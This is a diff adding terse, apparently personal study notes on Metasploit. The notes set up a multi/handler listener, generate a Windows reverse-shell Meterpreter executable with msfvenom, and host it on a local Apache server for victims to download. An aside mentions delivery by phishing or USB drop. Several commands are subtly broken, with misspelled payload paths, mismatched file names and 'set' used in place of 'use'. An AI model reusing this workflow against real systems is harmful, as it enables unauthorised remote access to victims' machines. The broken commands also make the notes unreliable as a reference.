@@ -1,0 +1,58 @@
+metaspolit
+msfconsole--->to get the best version of metaspolit
+
+help
+search wordpress
+set /exploit/multi/handler
+set LHOST ip address
+show options
+ set LPORT 80
+show payload
+search meterpreter
+set payload payload/windows/x64/meterpreter_reverse_ipv6_tcp
+show options
+exploit
+msfvenom -p windoes/meterpreter/reverse_tcp Lhost=ip Lport=4444 -f exe -o ranger.exe
+cp range.exe /var/www/html
+service apache2 start
+
+
+
+
+
+
+
+&&&&&&
+(In Metasploit, multi/handler is a payload handler module. It's not an exploit itself, but it listens for incoming connections from payloads — usually after you've successfully exploited a system or delivered a payload through another method (like social engineering, phishing, or a USB drop).)
+&&&&&&&
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+locate metaspolit
+cd /usr/share/metasploit-framework
+ls
+cd data
+ls
+cd meterpreter
+ls
+cd ../
+ls
+cd wordlists
+ls
